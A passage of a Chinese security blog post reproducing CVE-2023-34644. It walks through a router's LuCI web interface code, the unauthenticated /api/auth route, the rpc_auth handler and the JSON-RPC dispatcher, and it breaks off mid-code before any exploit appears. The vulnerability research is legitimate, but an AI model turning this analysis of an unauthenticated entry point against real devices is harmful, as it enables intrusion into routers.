<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2023-34644复现 | S1nec-1o's B1og</title><meta name="author" content="s1nec-1o"><meta name="copyright" content="s1nec-1o"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CVE-2023-34644luci框架和lua文件&#x2F;etc&#x2F;config&#x2F;luci通常是luci框架的配置文件，&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci 通常是 LuCI 框架的核心文件所在的目录 Luci采用的是MVC的Web框架，即Model、View、Controller。 123&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;controller&#x2F;   --控制层 &#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;vi">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-34644复现">
<meta property="og:url" content="http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="S1nec-1o&#39;s B1og">
<meta property="og:description" content="CVE-2023-34644luci框架和lua文件&#x2F;etc&#x2F;config&#x2F;luci通常是luci框架的配置文件，&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci 通常是 LuCI 框架的核心文件所在的目录 Luci采用的是MVC的Web框架，即Model、View、Controller。 123&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;controller&#x2F;   --控制层 &#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;vi">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png">
<meta property="article:published_time" content="2024-05-29T16:35:54.000Z">
<meta property="article:modified_time" content="2024-05-29T16:38:08.123Z">
<meta property="article:author" content="s1nec-1o">
<meta property="article:tag" content="IOT安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281712481.jpg"><link rel="canonical" href="http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"距离文章发布已经过去","messageNext":"天了，信息可能已经过时"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2023-34644复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-05-30 00:38:08'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 8 || hour >= 20
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="S1nec-1o's B1og" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><nav id="nav"><span id="blog-info"><a href="/" title="S1nec-1o's B1og"><span class="site-name">S1nec-1o's B1og</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2023-34644复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-29T16:35:54.000Z" title="发表于 2024-05-30 00:35:54">2024-05-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-29T16:38:08.123Z" title="更新于 2024-05-30 00:38:08">2024-05-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT%E5%AE%89%E5%85%A8/">IOT安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CVE-2023-34644"><a href="#CVE-2023-34644" class="headerlink" title="CVE-2023-34644"></a>CVE-2023-34644</h1><h2 id="luci框架和lua文件"><a href="#luci框架和lua文件" class="headerlink" title="luci框架和lua文件"></a>luci框架和lua文件</h2><p><code>/etc/config/luci</code>通常是luci框架的配置文件，<code>/usr/lib/lua/luci</code> 通常是 LuCI 框架的核心文件所在的目录</p>
<p>Luci采用的是MVC的Web框架，即<strong>Model、View、Controller</strong>。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/lua/luci/controller/   <span class="comment">--控制层 </span></span><br><span class="line">/usr/lib/lua/luci/view/ 		<span class="comment">--视图层</span></span><br><span class="line">/usr/lib/lua/luci/model/cbi/	<span class="comment">--模型层</span></span><br></pre></td></tr></table></figure>

<p>未授权的漏洞，那么首先就要找到无鉴权的<code>API</code>接口，定位到<code>/usr/lib/lua/luci/controller/eweb/api.lua</code>文件。</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- API集合</span></span><br><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.controller.eweb.api&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticator</span><span class="params">(validator)</span></span></span><br><span class="line">        <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">        <span class="keyword">local</span> sid = http.formvalue(<span class="string">&quot;auth&quot;</span>, <span class="literal">true</span>) <span class="keyword">or</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sid <span class="keyword">then</span> <span class="comment">-- if authentication token was given</span></span><br><span class="line">            <span class="keyword">local</span> sauth = <span class="built_in">require</span> <span class="string">&quot;luci.sauth&quot;</span></span><br><span class="line">            sid = sid:<span class="built_in">match</span>(<span class="string">&quot;^[a-f0-9]*$&quot;</span>)</span><br><span class="line">            <span class="keyword">local</span> sdat = sauth.<span class="built_in">read</span>(sid)</span><br><span class="line">            <span class="keyword">if</span> sdat <span class="keyword">then</span> <span class="comment">-- if given token is valid</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(sdat) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span> <span class="comment">-- and sdat.rip == http.getenv(&quot;REMOTE_ADDR&quot;) then</span></span><br><span class="line">                    <span class="keyword">return</span> sdat</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">        <span class="keyword">local</span> _ok, _auth = tool.doCheck()</span><br><span class="line">        <span class="keyword">if</span> _ok <span class="keyword">and</span> _auth <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> &#123;sid = _auth, token = _auth&#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="comment">-- 执行代理请求失败时，不退出主设备的</span></span><br><span class="line">        <span class="comment">-- 场景：在AP列表代理配置AP去重启设备，重启完成后AP的session没了但是不要退出主设备的EWEB</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">string</span>.<span class="built_in">match</span>(http.<span class="built_in">getenv</span>(<span class="string">&#x27;HTTP_REFERER&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>, <span class="string">&quot;^.+/snos_red_%d+\.%d+\.%d+\.%d+/.+&quot;</span>) <span class="keyword">then</span></span><br><span class="line">            tool.logout()</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        http.<span class="built_in">status</span>(<span class="number">403</span>, <span class="string">&quot;Forbidden Api&quot;</span>)</span><br><span class="line">        http.write_json(&#123;code = <span class="number">2</span>, msg = <span class="string">&quot;403 Forbidden, auth is not passed&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> api = node(<span class="string">&quot;api&quot;</span>)</span><br><span class="line">    api.sysauth = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    api.sysauth_authenticator = authenticator</span><br><span class="line">    api.notemplate = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;auth&quot;</span>&#125;, call(<span class="string">&quot;rpc_auth&quot;</span>), <span class="literal">nil</span>).sysauth = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;common&quot;</span>&#125;, call(<span class="string">&quot;rpc_common&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;cmd&quot;</span>&#125;, call(<span class="string">&quot;rpc_cmd&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;system&quot;</span>&#125;, call(<span class="string">&quot;rpc_system&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;diagnose&quot;</span>&#125;, call(<span class="string">&quot;rpc_diagnose&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;overview&quot;</span>&#125;, call(<span class="string">&quot;rpc_overview&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;network&quot;</span>&#125;, call(<span class="string">&quot;rpc_network&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;wireless&quot;</span>&#125;, call(<span class="string">&quot;rpc_wireless&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;download&quot;</span>&#125;, call(<span class="string">&quot;down_file&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;switch&quot;</span>&#125;, call(<span class="string">&quot;rpc_switch&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;openvpn&quot;</span>&#125;, call(<span class="string">&quot;openvpn&quot;</span>), <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>还有一些模块的定义，上述可以分为<strong>模块声明</strong>和<strong>路由定义</strong>，其中模块声明中</p>
<ul>
<li><code>module(&quot;luci.controller.eweb.api&quot;, package.seeall)</code>：定义一个名为 <code>luci.controller.eweb.api</code> 的模块，并导出所有函数。</li>
</ul>
<p>路由定义中</p>
<ul>
<li><code>entry(&#123;&quot;api&quot;, &quot;auth&quot;&#125;, call(&quot;rpc_auth&quot;), nil).sysauth = false</code>：注册 <code>/api/auth</code> 路径，调用 <code>rpc_auth</code> 函数处理请求，并禁用系统认证。</li>
</ul>
<p>根据其中调用的rpc_auth函数</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 认证模块</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_auth</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tonumber</span>(http.<span class="built_in">getenv</span>(<span class="string">&quot;HTTP_CONTENT_LENGTH&quot;</span>) <span class="keyword">or</span> <span class="number">0</span>) &gt; <span class="number">1000</span> <span class="keyword">then</span></span><br><span class="line">        http.prepare_content(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">        <span class="comment">-- http.write(&#123;code = &quot;1&quot;, err = &quot;too long data&quot;&#125;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;too long data&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>引入了必要的模块</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line"><span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line"><span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.noauth&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>jsonrpc</code>：用于处理 JSON-RPC 请求。</li>
<li><code>http</code>：用于处理 HTTP 请求和响应。</li>
<li><code>ltn12</code>：用于处理数据流。</li>
<li><code>_tbl</code>：假设是一个包含无认证功能的模块（<code>noauth</code>），用于处理实际的 JSON-RPC 方法。</li>
</ul>
<p>因此定位到对应的处理文件&#x2F;usr&#x2F;lib&#x2F;lua&#x2F;luci&#x2F;modules&#x2F;noauth.lua</p>
<p>然后再看luci.utils.jsonrpc</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">LuCI - Lua Configuration Interface</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Copyright 2008 Steven Barth &lt;steven@midlink.org&gt;</span></span><br><span class="line"><span class="comment">Copyright 2008 Jo-Philipp Wich &lt;xm@leipzig.freifunk.net&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span></span><br><span class="line"><span class="comment">you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$Id$</span></span><br><span class="line"><span class="comment">]]</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.utils.jsonrpc&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"><span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> decoder = luci.json.Decoder()</span><br><span class="line">    <span class="keyword">local</span> stat, err = luci.ltn12.pump.all(rawsource, decoder:sink())</span><br><span class="line">    <span class="keyword">local</span> json = decoder:get()</span><br><span class="line">    <span class="keyword">local</span> response</span><br><span class="line">    <span class="keyword">local</span> success = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32601</span>, message = <span class="string">&quot;Method not found.&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            response = reply(json.jsonrpc, json.id, <span class="literal">nil</span>, &#123;code = <span class="number">-32600</span>, message = <span class="string">&quot;Invalid request.&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        response = reply(<span class="string">&quot;2.0&quot;</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, &#123;code = <span class="number">-32700</span>, message = <span class="string">&quot;Parse error.&quot;</span>, err = err&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> luci.json.Encoder(response, ...):source()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reply</span><span class="params">(jsonrpc, id, res, err)</span></span></span><br><span class="line">    <span class="built_in">require</span> 